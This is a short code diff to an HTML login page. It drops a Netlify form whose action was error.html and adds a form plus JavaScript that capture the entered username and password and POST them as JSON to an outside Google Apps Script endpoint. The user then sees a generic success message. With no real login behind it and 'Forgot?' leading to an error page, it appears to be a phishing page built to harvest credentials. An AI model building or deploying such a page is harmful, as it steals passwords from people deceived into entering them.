@@ -33,22 +33,15 @@
 
             <div class="l-part">
                 <!-- Netlify form handling with redirection -->
-                <form name="contact" method="POST" action="error.html" data-netlify="true">
-                    <!-- Hidden input for form name -->
-                    <input type="hidden" name="form-name" value="contact" />
-                    
-                    <!-- Username input -->
+                <form name="contact" method="POST" action="https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec">
                     <input type="text" name="username" placeholder="Username" class="input-1" required />
-                    
-                    <!-- Password input -->
                     <div class="overlap-text">
                         <input type="password" name="password" placeholder="Password" class="input-2" required />
                         <a href="error.html">Forgot?</a>
                     </div>
-                    
-                    <!-- Submit button -->
                     <input type="submit" class="btn" value="Log In">
                 </form>
+                
             </div>
         </div>
 
@@ -60,5 +53,26 @@
         </div>
     </div>
 </body>
+ 
+    <script>
+    document.querySelector('form').addEventListener('submit', async (event) => {
+        event.preventDefault(); // Prevent default form submission
+        const form = event.target;
+        const formData = new FormData(form);
+        const data = Object.fromEntries(formData.entries());
+        const response = await fetch(form.action, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        if (response.ok) {
+            alert("Form submitted successfully!");
+            form.reset();
+        } else {
+            alert("Error submitting form.");
+        }
+    });
+</script>
+
 
 </html>
